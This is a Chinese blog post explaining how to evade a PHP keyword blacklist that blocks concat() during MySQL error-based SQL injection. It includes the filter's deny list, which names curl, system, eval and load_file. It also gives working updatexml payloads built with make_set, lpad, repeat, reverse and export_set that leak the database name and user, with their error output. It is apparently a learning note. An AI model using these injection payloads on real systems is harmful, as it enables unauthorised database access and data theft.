<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width, initial-scale=1"><title>当concat()在报错注入不可用时</title><link rel="shortcut icon" href="/images/avatar.png"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css"><script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script></head><body><nav class="main-nav"><a href="/">Home</a><a href="/archives">Archives</a></nav><div class="profile"><section id="wrapper"><header id="header"><a href="/about"><img class="2x" id="avatar" src="/images/avatar.png"></a><h1>The clown is laughing at you</h1><h2></h2></header></section></div><section class="post" id="wrapper"><article><header><h1>当concat()在报错注入不可用时</h1><h2 class="headline">Apr 01, 2019 7:12·585 words
·2 minutes read<span class="tags"></span></h2></header><div id="toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01"><span class="toc-text">0x01</span></a></li></ol></div><section id="post-body"><p>当concat()在报错注入不可用时</p>
<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>这里有这么一段代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//cpnfig.php</span></span><br><span class="line">$servername = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"root"</span>;</span><br><span class="line">$password = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"day1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stop_hack</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">	$pattern = <span class="string">"insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval"</span>;</span><br><span class="line">	$back_list = explode(<span class="string">"|"</span>,$pattern);</span><br><span class="line">	<span class="keyword">foreach</span>($back_list <span class="keyword">as</span> $hack)&#123;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">"/$hack/i"</span>, $value))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"$hack detected!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>很明显，这里是一个黑名单过滤，将绝大多数的注入关键词过滤掉了，sqlmap无解下，报错注入时，发现concat()，会被过滤掉。</p>
<p>报错注入有两种：</p>
<p>extractvalue(1,’what we want’)<br><img src="/2019/04/01/当concat-在报错注入不可用时/1.png" alt=""></p>
<p>updatexml(1,’what we want’,1)<br><img src="/2019/04/01/当concat-在报错注入不可用时/2.png" alt=""></p>
<p>具体用法参考:<a href="http://blkstone.github.io/2017/11/09/updatexml-sqli/" target="_blank" rel="noopener">MySQL updatexml()、extractvalue() 报错型SQL注入</a></p>
<p>当cnoncat不可用时，我们该怎么办？</p>
<p>使用函数make_set()、lpad()、reverse()、repeat()、export_set()，来代替concat()的作用。<br><strong>注意</strong>：<strong>lpad()、reverse()、repeat()这三个函数使用的前提是所查询的值中，必须至少含有一个特殊字符，否则会漏掉一些数据</strong></p>
<p>详解make_set()函数的用法</p>
<p>MAKE_SET(bits,str1,str2,…)<br>返回一个设定值 (一个包含被’,’号分开的字字符串的字符串) ，由在bits 组中具有相应的比特的字符串组成。<br>str1 对应比特 0, str2 对应比特1,以此类推。str1, str2, …中的 NULL值不会被添加到结果中。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT MAKE_SET(<span class="number">1</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>);</span><br><span class="line"></span><br><span class="line">-&gt; <span class="string">'a'</span></span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT MAKE_SET(<span class="number">1</span> | <span class="number">4</span>,<span class="string">'hello'</span>,<span class="string">'nice'</span>,<span class="keyword">NULL</span>,<span class="string">'world'</span>);</span><br><span class="line"></span><br><span class="line">-&gt; <span class="string">'hello'</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/01/当concat-在报错注入不可用时/3.png" alt=""></p>
<p>讲回extract(),updatexml()函数</p>
<p>extractvalue(),updatexml()函数有个特点就是：<strong>updatexml中存在特殊字符、字母时，会出现报错，报错信息为特殊字符、字母及之后的内容</strong><br>如以下结果:<br><img src="/2019/04/01/当concat-在报错注入不可用时/4.png" alt=""><br><img src="/2019/04/01/当concat-在报错注入不可用时/5.png" alt=""></p>
<p>所以结合make_set()函数，我们在concat()不可用的情况下，可以这么做<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(<span class="number">1</span>,make_set(<span class="number">3</span>,<span class="string">'~'</span>,(select database())),<span class="number">1</span>);            </span><br><span class="line"></span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">'~,day1'</span></span><br></pre></td></tr></table></figure></p>
<p>然后使用其他类似函数也是一样的效果，不过就是记得加上特殊字符，防止数据遗漏，其实我觉得以防万一还是都加上特殊符号吧<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(<span class="number">1</span>,lpad(<span class="string">'@'</span>,<span class="number">30</span>,(select user())),<span class="number">1</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">'@localhostroot@localhostr@'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select updatexml(<span class="number">1</span>,repeat((select user()),<span class="number">2</span>),<span class="number">1</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">'@localhostroot@localhost'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select updatexml(<span class="number">1</span>,(select user()),<span class="number">1</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">'@localhost'</span></span><br><span class="line">mysql&gt; select updatexml(<span class="number">1</span>,reverse((select user())),<span class="number">1</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">'@toor'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select updatexml(<span class="number">1</span>,export_set(<span class="number">1</span>|<span class="number">2</span>,<span class="string">'::'</span>,(select user())),<span class="number">1</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">'::,::,root@localhost,root@localh'</span></span><br></pre></td></tr></table></figure></p>
<p>小结：很小的知识点，但是学到很多.</p>
</section><nav id="post-nav"><span class="prev"><a href="/2019/04/02/sql注入奇巧淫技/"><span class="arrow">←</span>Newer Posts</a></span><span class="next"><a href="/2019/03/30/依葫芦画瓢之in-array函数缺陷/">Older Posts<span class="arrow">→</span></a></span></nav></article></section><footer id="footer"><div id="social"><a class="symbol" href="https://github.com/fuzhouxxdong"><i class="fa fa-github"></i></a></div><p class="small">© Copyright 2018 &nbsp;<i class="fa fa-heart" aria-hidden="true">&nbsp;Dxx</i></p><p class="small">Powered by &nbsp;<a href="https://hexo.io/">Hexo &nbsp;</a>Theme By &nbsp;<a href="https://github.com/fuzhouxxdong/hexo-theme-dxx">Dxx</a></p></footer><script>hljs.initHighlightingOnLoad();</script></body></html>